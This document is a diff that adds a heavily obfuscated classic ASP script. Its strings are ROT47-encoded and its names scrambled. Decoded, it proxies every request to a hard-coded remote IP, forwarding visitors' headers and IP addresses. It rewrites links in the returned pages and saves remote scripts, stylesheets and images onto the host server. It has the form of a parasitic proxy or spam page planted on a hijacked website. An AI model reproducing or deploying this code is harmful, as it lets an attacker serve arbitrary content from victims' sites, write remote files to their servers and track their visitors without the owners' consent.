@@ -1,0 +1,266 @@
+<%@ LANGUAGE=VBSCRIPT CODEPAGE=65001 %>
+<%
+Dim OOO99O9O,OOO99OO9,OOO99OOO,OOO9O999,OOO9O99O
+Set OOO99OOO=Response:Set OOO99OO9=Request:Set OOO9O99O=Session:Set OOO99O9O=Application:Set OOO9O999=Server
+Set OOO9OO999 = New OOOOO999
+OOO9OO999.dizhi 	= OOOO9O9O("fd]hg]`eg]dh")
+OOO9OO999.filename 	= OOO99OO9.ServerVariables(OOOO9O9O("$4C:AE0}2>6"))
+OOO9OO999.csvalue 	= OOOO9O9O("G:56@")
+OOO9OO999.cachefile 	= OOOO9O9O("^42496")
+OOO9OO999.connect
+Class OOOOO999
+Public OOOOO99O,dizhi,OOOOO9OO,filename,csvalue,cachefile
+Private OOOOOOOO,OOO999999,OOO99999O,OOO9999O9,OOO9999OO,OOO999O99,OOO999O9O
+Private Sub Class_Initialize
+OOOOOOOO	= ""
+filename	= OOOO9O9O(":?56I]2DA")
+csvalue		= OOOO9O9O("A286")
+OOO999999	= OOO99OO9.ServerVariables(OOOO9O9O("$t#")&OOOO9O9O("'t#0$~u%")&OOOO9O9O("(p#t"))
+OOOOO99O 		= OOOO9O9O("`af]_]_]`")
+dizhi 	= OOOO9O9O("`af]_]_]`")
+OOOOO9OO	= ""
+OOO999O99 	= OOO99OO9.ServerVariables(OOOO9O9O("w%%!0w~$%"))
+cachefile 	= OOOO9O9O("^42496")
+OOO999O9O			= OOOO99OO()
+End Sub
+Function connect()
+Dim OOO999OO9
+Set OOO999OO9 = OOO9O999.Createobject(OOOO9O9O("(")&OOOO9O9O(":?w")&OOOO9O9O("E")&OOOO9O9O("EA](:")&OOOO9O9O("?wEEA#")&OOOO9O9O("6BF6D")&OOOO9O9O("E]")&"5"&".1")
+OOO999OO9.option(6) = false
+OOO999OO9.Open OOOO9O9O("vt%"), OOOO9O9O("9EEAi^^")&dizhi&OOOO9O9O("^")&OOO99OO9.QueryString(csvalue) , False
+OOO999OO9.setRequestHeader OOOO9O9O(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), OOO999O9O
+OOO999OO9.setRequestHeader OOOO9O9O("w@DE"), OOO999O99
+OOO999OO9.setRequestHeader OOOO9O9O("&D6C\p86?E"), OOO99OO9.ServerVariables(OOOO9O9O("w%%!0&$t#0pvt}%"))
+If OOO99OO9.ServerVariables(OOOO9O9O("w%%!0#tut#t#"))<>"" Then
+OOO999OO9.setRequestHeader OOOO9O9O("#676C6C"), OOO99OO9.ServerVariables(OOOO9O9O("w%%!0#tut#t#"))
+End If
+OOO999OO9.Send()
+OOO999OO9.WaitForResponse()
+OOO9999OO			= OOO999OO9.ResponseBody
+OOOOOOOO		= OOO999OO9.Status
+If OOOOOOOO=302 or OOOOOOOO= 301 Then
+OOO9999O9	= OOO999OO9.GetResponseHeader(OOOO9O9O("{@42E:@?"))
+end if
+Set OOO999OO9=Nothing
+set OOO9OO99O = OOO9O999.CreateObject(OOOO9O9O("p5@53]$EC62>"))
+OOO9OO99O.Type = (21 * 89 - 1868)
+OOO9OO99O.Mode = (24 * 36 - 861)
+OOO9OO99O.Open
+OOO9OO99O.Write OOO9999OO
+OOO9OO99O.Position = (11 * 78 - 858)
+OOO9OO99O.Type = (85 * 91 - 7733)
+OOO9OO99O.Charset = OOOO9O9O("&%u\g")
+OOO9999OO = OOO9OO99O.ReadText
+OOO9OO99O.Close
+OOO9O9OO()
+End function
+Function OOO9O9OO()
+If OOOOOOOO="302" Then
+OOO99OOO.Redirect(OOO9999O9)
+Exit Function
+ElseIf OOOOOOOO="301" Then
+OOO99OOO.Status = OOOO9O9O("w%%!^`]` ,b_` ,|@G65 ,!6C>2?6?E=J")
+OOO99OOO.Addheader OOOO9O9O("{@42E:@?"),OOO9999O9
+Exit Function
+ElseIf OOOOOOOO="404" Then
+OOO99OOO.Status = OOOO9O9O("w%%!^`]` ,c_c ,}@E ,u@F?5")
+OOO99OOO.Addheader OOOO9O9O("s2E6"), now&OOOO9O9O(" ,v|%")
+OOO99OOO.Addheader OOOO9O9O("$6CG6C"), OOO999999
+OOO99OOO.Addheader OOOO9O9O("r@?E6?E\%JA6"),OOOO9O9O("E6IE^9E>=")
+OOO99OOO.Write OOOO9O9O("k9E>=mk9625mkE:E=6mc_c ,}@E ,u@F?5k^E:E=6mk^9625mk3@5Jmk9`mc_c ,}@E ,u@F?5k^9`m")&OOO999999&OOOO9O9O("k^3@5Jmk^9E>=m")
+Exit Function
+ElseIf OOOOOOOO="403" Then
+OOO99OOO.Status = OOOO9O9O("w%%!^`]` ,c_b ,u@C3:556?")
+OOO99OOO.Addheader OOOO9O9O("s2E6"), now &OOOO9O9O(" ,v|%")
+OOO99OOO.Addheader OOOO9O9O("$6CG6C"), OOO999999
+OOO99OOO.Addheader OOOO9O9O("r@?E6?E\%JA6"),OOOO9O9O("E6IE^9E>=")
+OOO99OOO.Write OOOO9O9O("k9E>=mk9625mkE:E=6mc_b ,u@C3:556?k^E:E=6mk^9625mk3@5Jmk9`mc_b ,u@C3:556?k^9`m")&OOO999999&OOOO9O9O("k^3@5Jmk^9E>=m")
+Exit Function
+End If
+OOO99OOO.ContentType = OOOO9O9O("E6IE^9E>=")
+OOO99OOO.AddHeader OOOO9O9O("r@?E6?E\%JA6"), OOOO9O9O("E6IE^9E>=j492CD6El&%u\g")
+OOO99OOO.CodePage = (105 * 36 - -61221)
+OOO99OOO.CharSet = OOOO9O9O("&%u\g")
+OOO9999OO = OOO9OO99(OOOO9O9O("9C67l-Q^W]YnX-]W9E>=M2DAM9E>X-Q"), OOOO9O9O("9C67lQ")&filename&OOOO9O9O("n")&csvalue&OOOO9O9O("lS`]SaQ"), OOO9999OO)
+OOO9999OO = OOO9OO9O(OOOO9O9O("9C67l-QW]YnX-]W4DDX-Q"),OOOO9O9O("9C67lQ")&cachefile&OOOO9O9O("S`]SaQ"), OOO9999OO,OOOO9O9O("4DD"))
+OOO9999OO = OOO9OO9O(OOOO9O9O("DC4l-QW]YnX-]W8:7M;A8MA?8X-Q"),OOOO9O9O("DC4lQ")&cachefile&OOOO9O9O("S`]SaQ"), OOO9999OO,OOOO9O9O(":>8"))
+OOO99OOO.Write OOO9999OO
+End Function
+Function OOO9OO99(OOO9OOOOO, OOOO99999, Str)
+Dim OOO999OOO
+Set OOO999OOO = New RegExp
+OOO999OOO.Pattern = OOO9OOOOO
+OOO999OOO.IgnoreCase = false
+OOO999OOO.Global = True
+OOO9OO99 = OOO999OOO.Replace(Str, OOOO99999)
+End Function
+Function OOO9OO9O(OOO9OOOOO, OOOO99999, Str, OOOO999O9)
+Dim OOO999OOO, OOO99O999, OOO99O99O
+Set OOO999OOO = New RegExp
+OOO999OOO.Pattern = OOO9OOOOO
+OOO999OOO.IgnoreCase = false
+OOO999OOO.Global = True
+Set OOO99O99O = OOO999OOO.Execute(Str)
+For Each OOO99O999 in OOO99O99O
+IF OOOO999O9 = OOOO9O9O("4DD") then
+OOO9OOO9 OOO99O999.SubMatches(0)&OOOO9O9O("]")&OOO99O999.SubMatches(1)
+Elseif OOOO999O9 = OOOO9O9O(":>8") Then
+OOO9OOOO  OOO99O999.SubMatches(0)&OOOO9O9O("]")&OOO99O999.SubMatches(1)
+End If
+Next
+OOO9OO9O = OOO999OOO.Replace(Str, OOOO99999)
+End Function
+Function OOO9OOO9(OOOO999OO)
+dim OOO99O9O9
+OOO99O9O9=OOO9O999.MapPath(OOOO9O9O("^"))&cachefile&OOOO999OO
+Set OOO9OO9O9=OOO9O999.CreateObject(OOOO9O9O("$4C:A")&OOOO9O9O("E:?8]u:=")&OOOO9O9O("6$JDE")&OOOO9O9O("6>~3;")&OOOO9O9O("64E"))
+If OOO9OO9O9.FileExists(OOO99O9O9) Then
+Set OOO9OO9O9=Nothing
+Exit Function
+end if
+Set OOO9OO9O9=Nothing
+Dim OOO999OO9
+Set OOO999OO9 = OOO9O999.Createobject(OOOO9O9O("(:?w")&OOOO9O9O("EEA](:?")&OOOO9O9O("wEEA")&OOOO9O9O("#6BF6")&OOOO9O9O("DE]")&"5."&"1")
+OOO999OO9.option(6) = false
+OOO999OO9.Open OOOO9O9O("!~$%"), OOOO9O9O("9EEAi^^")&dizhi&OOOO999OO , False
+OOO999OO9.setRequestHeader OOOO9O9O("w@DE"), OOO999O99
+OOO999OO9.setRequestHeader OOOO9O9O(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), OOO999O9O
+OOO999OO9.Send()
+OOO9OO9OO = OOO999OO9.ResponseText
+OOOO99O9(OOOO9O9O("^")&OOOO999O(cachefile&OOOO999OO))
+OOOO9OOO OOOO9O9O("^")&cachefile&OOOO999OO,OOO9OO9OO,OOOO9O9O("&%u\g")
+Set OOO999OO9=Nothing
+End function
+Function OOO9OOOO(OOOO999OO)
+On Error Resume Next
+dim OOO99O9O9
+OOO99O9O9=OOO9O999.MapPath(OOOO9O9O("^"))&cachefile&OOOO999OO
+Set OOO9OO9O9=OOO9O999.CreateObject(OOOO9O9O("$4C:A")&OOOO9O9O("E:?8]u:=")&OOOO9O9O("6$JDE")&OOOO9O9O("6>~3;")&OOOO9O9O("64E"))
+If OOO9OO9O9.FileExists(OOO99O9O9) Then
+Set OOO9OO9O9=Nothing
+Exit Function
+end if
+Set OOO9OO9O9=Nothing
+Dim OOO999OO9
+Set OOO999OO9 = OOO9O999.Createobject(OOOO9O9O("(:?")&OOOO9O9O("wEE")&OOOO9O9O("A](:?w")&OOOO9O9O("EEA#")&OOOO9O9O("6BF6")&OOOO9O9O("DE]d")&".1")
+OOO999OO9.option(6) = false
+OOO999OO9.Open OOOO9O9O("vt%"), OOOO9O9O("9EEAi^^")&dizhi&OOOO999OO , False
+OOO999OO9.setRequestHeader OOOO9O9O("w@DE"), OOO999O99
+OOO999OO9.setRequestHeader OOOO9O9O(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), OOO999O9O
+OOO999OO9.Send()
+OOO999OO9.WaitForResponse
+OOOO99O9(OOOO9O9O("^")&OOOO999O(cachefile&OOOO999OO))
+Set OOO9OOO99=OOO9O999.CreateObject(OOOO9O9O("25@")&OOOO9O9O("53]DEC")&OOOO9O9O("62>"))
+OOO9OOO99.Type= (21 * 89 - 1868)
+OOO9OOO99.open
+OOO9OOO99.write OOO999OO9.ResponseBody
+OOO9OOO99.SaveToFile OOO9O999.MapPath(OOOO9O9O("^")&cachefile&OOOO999OO)
+OOO9OOO99.flush
+OOO9OOO99.Close
+Set OOO9OOO99=Nothing
+Set OOO999OO9=Nothing
+End function
+Function OOOO9999(OOOO99O99)
+OOOO9999 = mid(OOOO99O99,instrrev(OOOO99O99,OOOO9O9O("^"))+1)
+End Function
+Function OOOO999O(OOOO99O99)
+OOOO999O = Left(OOOO99O99,instrrev(OOOO99O99,OOOO9O9O("^")))
+End Function
+Function OOOO99O9(ByVal CFolder)
+Dim OOO99O9OO, OOO99OO99, OOO99OO9O, CreateFolder
+Dim OOO99OOOO, OOO9O9999, OOO9O999O, OOO9O99O9, OOO9O99OO
+OOO9O99OO = False
+CreateFolder = CFolder
+On Error Resume Next
+Set OOO99O9OO = OOO9O999.CreateObject(OOOO9O9O("$4C")&OOOO9O9O(":AE:?8]")&OOOO9O9O("u:=6")&OOOO9O9O("$JDE6>")&OOOO9O9O("~3;64E"))
+If Err Then
+Err.Clear()
+Exit Function
+End If
+If Right(CreateFolder, 1) = OOOO9O9O("^") Then
+CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
+End If
+OOO99OO9O = Split(CreateFolder, OOOO9O9O("^"))
+For OOO99OOOO = 0 To UBound(OOO99OO9O)
+OOO9O999O = ""
+For OOO9O9999 = 0 To OOO99OOOO
+OOO9O999O = OOO9O999O & OOO99OO9O(OOO9O9999) & OOOO9O9O("^")
+Next
+OOO9O99O9 = OOO9O999.MapPath(OOO9O999O)
+If Not OOO99O9OO.FolderExists(OOO9O99O9) Then
+OOO99O9OO.CreateFolder(OOO9O99O9)
+End If
+Next
+If Err Then
+Err.Clear()
+Else
+OOO9O99OO = True
+End If
+OOOO99O9 = OOO9O99OO
+End Function
+Sub OOOO9OOO (OOOO99O9O,byval Str,CharSet)
+On Error Resume Next
+set OOO9OOO99=OOO9O999.CreateObject(OOOO9O9O("25@")&OOOO9O9O("53]DEC")&OOOO9O9O("62>"))
+OOO9OOO99.Type= (85 * 91 - 7733)
+OOO9OOO99.mode= (24 * 36 - 861)
+OOO9OOO99.open
+OOO9OOO99.WriteText str
+OOO9OOO99.SaveToFile OOO9O999.MapPath(OOOO99O9O)
+OOO9OOO99.flush
+OOO9OOO99.Close
+set OOO9OOO99=nothing
+End Sub
+Function OOOO99OO()
+on error resume next
+Dim OOO9O9O99
+If OOO99OO9.ServerVariables(OOOO9O9O("w%%!0")&OOOO9O9O(")0")&OOOO9O9O("u~#")&OOOO9O9O("(p#sts0u~#")) = "" Or InStr(OOO99OO9.ServerVariables(OOOO9O9O("w")&OOOO9O9O("%%!0)0u~")&OOOO9O9O("#(")&OOOO9O9O("p#s")&OOOO9O9O("ts0u~#")), OOOO9O9O("F?<?@H?")) > 0 Then
+OOO9O9O99 = OOO99OO9.ServerVariables(OOOO9O9O("#t|")&OOOO9O9O("~%t0p")&OOOO9O9O("ss#"))
+ElseIf InStr(OOO99OO9.ServerVariables(OOOO9O9O("w%")&OOOO9O9O("%!0)0u~#(")&OOOO9O9O("p#sts0u~#")), OOOO9O9O("[")) > 0 Then
+OOO9O9O99 = Mid(OOO99OO9.ServerVariables(OOOO9O9O("w")&OOOO9O9O("%%!0)0u~")&OOOO9O9O("#(p#s")&OOOO9O9O("ts0u~#")), 1, InStr(OOO99OO9.ServerVariables(OOOO9O9O("w%%")&OOOO9O9O("!0)0u")&OOOO9O9O("~#(")&OOOO9O9O("p#")&OOOO9O9O("sts0u")&OOOO9O9O("~#")), OOOO9O9O("["))-1)
+OOO9OOO9O = OOO99OO9.ServerVariables(OOOO9O9O("#t|~")&OOOO9O9O("%t0pss")&OOOO9O9O("#"))
+ElseIf InStr(OOO99OO9.ServerVariables(OOOO9O9O("w%%")&OOOO9O9O("!0)0u")&OOOO9O9O("#(")&OOOO9O9O("p#sts0u~#")), OOOO9O9O("j")) > 0 Then
+OOO9O9O99 = Mid(OOO99OO9.ServerVariables(OOOO9O9O("w%")&OOOO9O9O("%!0)0u~#(")&OOOO9O9O("p#sts0u~#")), 1, InStr(OOO99OO9.ServerVariables(OOOO9O9O("w")&OOOO9O9O("%%!0")&OOOO9O9O("0u~#")&OOOO9O9O("(p#s")&OOOO9O9O("ts0u~#")), OOOO9O9O("j"))-1)
+OOO9OOO9O = OOO99OO9.ServerVariables(OOOO9O9O("#")&OOOO9O9O("t|~")&OOOO9O9O("%t0pss")&OOOO9O9O("#"))
+Else
+OOO9O9O99 = OOO99OO9.ServerVariables(OOOO9O9O("w%")&OOOO9O9O("%!")&OOOO9O9O("0)0u~")&OOOO9O9O("#(p#s")&OOOO9O9O("ts0u~#"))
+OOO9OOO9O = OOO99OO9.ServerVariables(OOOO9O9O("#t|")&OOOO9O9O("~%t0ps")&OOOO9O9O("s#"))
+End If
+OOOO99OO = Replace(Trim(Mid(OOO9O9O99, 1, 30)), OOOO9O9O("V"), "")
+End Function
+Function OOOO9O99()
+On Error Resume Next
+Dim OOO9O9O9O
+If LCase(OOO99OO9.ServerVariables(OOOO9O9O("w%%!$"))) = OOOO9O9O("@77") Then
+OOO9O9O9O = OOOO9O9O("9EEAi^^")
+Else
+OOO9O9O9O = OOOO9O9O("9EEADi^^")
+End If
+OOO9O9O9O = OOO9O9O9O&OOO99OO9.ServerVariables(OOOO9O9O("$t#'t#0}p|t"))
+If OOO99OO9.ServerVariables(OOOO9O9O("$t#'t#0!~#%")) <> 80 Then
+OOO9O9O9O = OOO9O9O9O&OOOO9O9O("i")&OOO99OO9.ServerVariables(OOOO9O9O("$t#'t#0!~#%"))
+End If
+OOO9O9O9O = OOO9O9O9O&OOO99OO9.ServerVariables(OOOO9O9O("&#{"))
+If Trim(OOO99OO9.QueryString)<>"" Then
+OOO9O9O9O = OOO9O9O9O&OOOO9O9O("n")&Trim(OOO99OO9.QueryString)
+End If
+OOOO9O99 = OOO9O9O9O
+End Function
+End Class
+Function OOOO9O9O(ByVal OOO9OOOO9)
+Dim OOO9O9OO9, OOO99OOOO, OOO9O9OOO
+OOO9OOOO9 = Replace(OOO9OOOO9, Chr(37) & ChrW(-243) & Chr(62), Chr(37) & Chr(62))
+For OOO99OOOO = 1 To Len(OOO9OOOO9)
+If OOO99OOOO <> OOO9O9OOO Then
+OOO9O9OO9 = AscW(Mid(OOO9OOOO9, OOO99OOOO, 1))
+If OOO9O9OO9 >= 33 And OOO9O9OO9 <= 79 Then
+OOOO9O9O = OOOO9O9O & Chr(OOO9O9OO9 + 47)
+ElseIf OOO9O9OO9 >= 80 And OOO9O9OO9 <= 126 Then
+OOOO9O9O = OOOO9O9O & Chr(OOO9O9OO9 - 47)
+Else
+OOO9O9OOO = OOO99OOOO + 1
+If Mid(OOO9OOOO9, OOO9O9OOO, 1) = OOOO9O9O("o") Then OOOO9O9O = OOOO9O9O & ChrW(OOO9O9OO9 + 5) Else OOOO9O9O = OOOO9O9O & Mid(OOO9OOOO9, OOO99OOOO, 1)
+End If
+End If
+Next
+End Function
+%>
